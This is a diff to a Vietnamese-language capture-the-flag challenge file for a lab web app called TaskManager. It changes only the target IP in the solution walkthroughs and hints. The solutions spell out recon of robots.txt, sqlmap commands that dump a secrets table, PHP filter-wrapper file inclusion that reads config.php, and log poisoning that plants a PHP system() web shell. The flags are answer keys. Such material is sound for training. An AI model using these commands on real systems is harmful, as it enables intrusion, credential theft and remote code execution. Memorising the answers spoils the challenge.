@@ -44,7 +44,7 @@
       "answer": "/admin_portal_v2",
       "answer_variable_name": null,
       "content": "Trang chủ công khai của TaskManager không hiển thị liên kết nào đến giao diện quản trị. Hãy bắt đầu bằng các bước reconnaissance cơ bản đối với ứng dụng web. Một số website có thể vô tình tiết lộ đường dẫn nhạy cảm trong file `robots.txt`.\n\nYêu cầu: nộp **đường dẫn của thư mục quản trị ẩn**, theo định dạng `/ten_thu_muc`, không nhập dấu `/` ở cuối.",
-      "solution": "Kiểm tra trang chủ công khai trước:\n```bash\ncurl http://172.16.0.10/\n```\n\nSau đó kiểm tra file crawler rules của website:\n```bash\ncurl http://172.16.0.10/robots.txt\n```\n\nFile `robots.txt` tiết lộ đường dẫn quản trị bị ẩn:\n```text\nDisallow: /admin_portal_v2\n```\n\nBạn cũng có thể chạy content discovery:\n```bash\ngobuster dir -u http://172.16.0.10 -w /usr/share/dirb/wordlists/common.txt -x php,txt\n```\n\nFlag là: ${ANSWER}\n",
+      "solution": "Kiểm tra trang chủ công khai trước:\n```bash\ncurl http://172.16.1.10/\n```\n\nSau đó kiểm tra file crawler rules của website:\n```bash\ncurl http://172.16.1.10/robots.txt\n```\n\nFile `robots.txt` tiết lộ đường dẫn quản trị bị ẩn:\n```text\nDisallow: /admin_portal_v2\n```\n\nBạn cũng có thể chạy content discovery:\n```bash\ngobuster dir -u http://172.16.1.10 -w /usr/share/dirb/wordlists/common.txt -x php,txt\n```\n\nFlag là: ${ANSWER}\n",
       "solution_penalized": true,
       "hints": [
         {
@@ -55,7 +55,7 @@
         },
         {
           "title": "Ví dụ lệnh",
-          "content": "Thử chạy: `curl http://172.16.0.10/robots.txt`. Tìm dòng `Disallow` để xác định đường dẫn bị ẩn.",
+          "content": "Thử chạy: `curl http://172.16.1.10/robots.txt`. Tìm dòng `Disallow` để xác định đường dẫn bị ẩn.",
           "hint_penalty": 0,
           "order": 1
         }
@@ -112,7 +112,7 @@
       "answer": "sk_live_51gHTofJustice",
       "answer_variable_name": null,
       "content": "Bạn đã chứng minh được form đăng nhập bị SQL Injection. Bây giờ hãy tự động hóa quá trình liệt kê và trích xuất dữ liệu trong cơ sở dữ liệu bằng **sqlmap**.\n\nYêu cầu: nộp giá trị của cột **`api_key`** trong bảng **`secrets`**.",
-      "solution": "Dùng sqlmap để kiểm tra tham số `user` của form đăng nhập:\n```bash\nuser@attacker:~$ sqlmap -u \"http://172.16.0.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch --dbs\nuser@attacker:~$ sqlmap -u \"http://172.16.0.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch -D taskmanager --tables\nuser@attacker:~$ sqlmap -u \"http://172.16.0.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch -D taskmanager -T secrets --dump\n```\n\nLệnh đầu tiên liệt kê database, lệnh thứ hai liệt kê các bảng trong database `taskmanager`, và lệnh cuối trích xuất bảng `secrets`.\n\nFlag là: ${ANSWER}\n",
+      "solution": "Dùng sqlmap để kiểm tra tham số `user` của form đăng nhập:\n```bash\nuser@attacker:~$ sqlmap -u \"http://172.16.1.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch --dbs\nuser@attacker:~$ sqlmap -u \"http://172.16.1.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch -D taskmanager --tables\nuser@attacker:~$ sqlmap -u \"http://172.16.1.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch -D taskmanager -T secrets --dump\n```\n\nLệnh đầu tiên liệt kê database, lệnh thứ hai liệt kê các bảng trong database `taskmanager`, và lệnh cuối trích xuất bảng `secrets`.\n\nFlag là: ${ANSWER}\n",
       "solution_penalized": true,
       "hints": [
         {
@@ -146,7 +146,7 @@
       "answer": "Db_S3cr3t_2024_wr4pp3r",
       "answer_variable_name": null,
       "content": "Tham số `?page=` trên dashboard dùng để nạp các file PHP nội bộ, ví dụ `dashboard.php?page=tasks.php`. Cơ chế kiểm tra đầu vào rất yếu: ứng dụng chỉ cố gắng xóa chuỗi `../`, nhưng không kiểm soát chặt file được include.\n\nNếu yêu cầu `config.php` trực tiếp, PHP sẽ thực thi file đó thay vì hiển thị mã nguồn, nên bạn không nhìn thấy nội dung cấu hình. Hãy dùng PHP stream wrapper để buộc máy chủ trả về **mã nguồn** dưới dạng base64.\n\nYêu cầu: nộp giá trị của hằng **`DB_PASS`** được định nghĩa trong `config.php`.",
-      "solution": "Cần có session đăng nhập từ Level 2. Sau đó gọi dashboard với PHP filter wrapper:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.0.10/admin_portal_v2/dashboard.php?page=php://filter/convert.base64-encode/resource=config.php\"\n```\n\nSao chép chuỗi base64 trong phản hồi rồi giải mã:\n```bash\nuser@attacker:~$ echo '<base64_blob>' | base64 -d\n```\n\nMã nguồn PHP sau khi giải mã sẽ chứa hằng `DB_PASS`.\n\nFlag là: ${ANSWER}\n",
+      "solution": "Cần có session đăng nhập từ Level 2. Sau đó gọi dashboard với PHP filter wrapper:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.1.10/admin_portal_v2/dashboard.php?page=php://filter/convert.base64-encode/resource=config.php\"\n```\n\nSao chép chuỗi base64 trong phản hồi rồi giải mã:\n```bash\nuser@attacker:~$ echo '<base64_blob>' | base64 -d\n```\n\nMã nguồn PHP sau khi giải mã sẽ chứa hằng `DB_PASS`.\n\nFlag là: ${ANSWER}\n",
       "solution_penalized": true,
       "hints": [
         {
@@ -186,7 +186,7 @@
       "answer": "taskmgr-prod-01",
       "answer_variable_name": null,
       "content": "Lỗ hổng LFI ở dashboard có thể include bất kỳ file nào mà tiến trình web server đọc được, bao gồm cả Apache access log. Mỗi request gửi đến web server sẽ được ghi vào log, trong đó có header `User-Agent`. Nếu bạn đặt mã PHP vào `User-Agent`, rồi include file log, PHP sẽ phân tích và thực thi đoạn mã đó.\n\nYêu cầu: nộp nội dung của file **`/etc/hostname`** trên máy `webserver`.",
-      "solution": "Bước 1 — ghi payload PHP vào access log thông qua header User-Agent:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" -A \"<?php system(\\$_GET['cmd']); ?>\" http://172.16.0.10/\n```\n\nBước 2 — include file log đã bị poisoning và truyền lệnh qua tham số `cmd`:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.0.10/admin_portal_v2/dashboard.php?page=/var/log/apache2/access.log&cmd=cat+/etc/hostname\"\n```\n\nKhi file log được `include()`, đoạn `<?php ... ?>` trong log được PHP xử lý như mã thật, và hàm `system()` sẽ chạy lệnh bạn truyền vào.\n\nFlag là: ${ANSWER}\n",
+      "solution": "Bước 1 — ghi payload PHP vào access log thông qua header User-Agent:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" -A \"<?php system(\\$_GET['cmd']); ?>\" http://172.16.1.10/\n```\n\nBước 2 — include file log đã bị poisoning và truyền lệnh qua tham số `cmd`:\n```bash\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.1.10/admin_portal_v2/dashboard.php?page=/var/log/apache2/access.log&cmd=cat+/etc/hostname\"\n```\n\nKhi file log được `include()`, đoạn `<?php ... ?>` trong log được PHP xử lý như mã thật, và hàm `system()` sẽ chạy lệnh bạn truyền vào.\n\nFlag là: ${ANSWER}\n",
       "solution_penalized": true,
       "hints": [
         {
